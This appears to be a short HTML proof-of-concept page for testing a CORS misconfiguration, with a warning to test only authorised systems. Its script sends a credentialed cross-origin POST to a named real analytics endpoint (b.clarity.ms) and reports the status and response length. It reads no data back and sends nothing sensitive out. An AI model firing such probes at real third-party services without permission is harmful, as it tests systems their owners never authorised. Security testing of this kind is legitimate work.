<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CORS PoC</title>
</head>
<body>
  <h2>CORS PoC - Test Only</h2>
  <p>Only run against systems you own or have permission to test.</p>
  <button id="run">Run PoC</button>
  <pre id="out"></pre>

<script>
document.getElementById('run').addEventListener('click', function() {
    const print = (msg) => {
        document.getElementById('out').textContent += msg + "\n";
    };

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://b.clarity.ms/collect", true);
    xhr.withCredentials = true;
    xhr.setRequestHeader("Content-Type", "text/plain");

    xhr.onload = function () {
        print("Status: " + xhr.status + " " + xhr.statusText);
        print("Response length: " + xhr.responseText.length);
        print("Check Network tab for CORS headers.");
    };

    xhr.onerror = function () {
        print("Network error or blocked by CORS.");
    };

    xhr.send("poc-test");
});
</script>
</body>
</html>
